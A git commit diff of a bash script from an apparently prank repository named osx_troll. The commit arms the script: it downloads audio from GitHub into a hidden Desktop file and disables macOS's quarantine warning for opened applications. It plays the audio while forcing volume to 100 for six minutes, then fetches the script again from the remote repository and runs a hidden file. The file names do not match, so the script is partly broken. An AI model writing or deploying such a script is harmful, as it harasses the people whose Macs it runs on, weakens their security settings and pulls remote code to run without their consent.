38a49b682215d6ed478eb9e6816d013ed45420c5
Me1922 <34125170+Me1955@users.noreply.github.com>
2021-05-14 09:46:52 +1000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,13 +1,13 @@
 #! /bin/bash
-curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/P.mp3 --output ~/Desktop/.troll.mp3
+curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/HT.mp3 --output ~/Desktop/.troll.mp3
 
 #Disable the “Are you sure you want to open this application?” dialog
 defaults write com.apple.LaunchServices LSQuarantine -bool false
 
 caffeinate &
-#afplay ~/Desktop/.troll.mp3 &
+afplay ~/Desktop/.troll.mp3 &
 
-end=$((SECONDS+5))
+end=$((SECONDS+360))
 
 while [ $SECONDS -lt $end ]; do
 	osascript -e 'set volume 100'
@@ -15,4 +15,4 @@ done
 
 curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh >> ~/Desktop/.run.sh
 chmod 777 ~/Desktop/.music.sh
-#sh ~/Desktop/.music.sh
+sh ~/Desktop/.music.sh
